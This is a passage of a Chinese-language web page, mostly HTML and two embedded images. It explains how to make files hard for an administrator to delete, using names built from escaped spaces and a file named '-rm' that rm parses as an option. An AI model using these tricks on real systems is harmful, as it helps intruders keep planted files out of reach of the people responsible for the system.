<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">bash</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 这里也是多一个空格。</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182305382544189-c173fa63427d89de529b1826dae67e4d.jpg" width="1008" height="654" class="img_ev3q"></p>
<p>这样建立的文件/文件夹管理员不知道是使用了几个转义符建立的，所以通过rm+tab是无法删除的。而且我测试使用rm -rf ./*也无法删除。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参数混淆拦截rm">参数混淆拦截rm<a href="#参数混淆拦截rm" class="hash-link" aria-label="参数混淆拦截rm的直接链接" title="参数混淆拦截rm的直接链接">​</a></h2>
<p>使用echo等工具新建一个文件名是<code>-rm</code>的文件，这样删除的时候bash会认为-rm是rm的参数。</p>
<p><img decoding="async" loading="lazy" src="/assets/images/15823418232003722972-e8698821da162270342021fc55d1af4e.jpg" width="1080" height="272" class="img_ev3q"></p>
<p>这样就可以阻止管理员去删除， 一般只有<code>rm -- &#x27;-rm&#x27;</code>才会删除掉。</p>
<p><img decoding="async" loading="lazy" src="data:image/jpeg;base64,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" width="626" height="134" class="img_ev3q"></p>
<p>但是如果管理员使用正常删除方式会报错。</p>
<p><img decoding="async" loading="lazy" src="data:image/jpeg;base64,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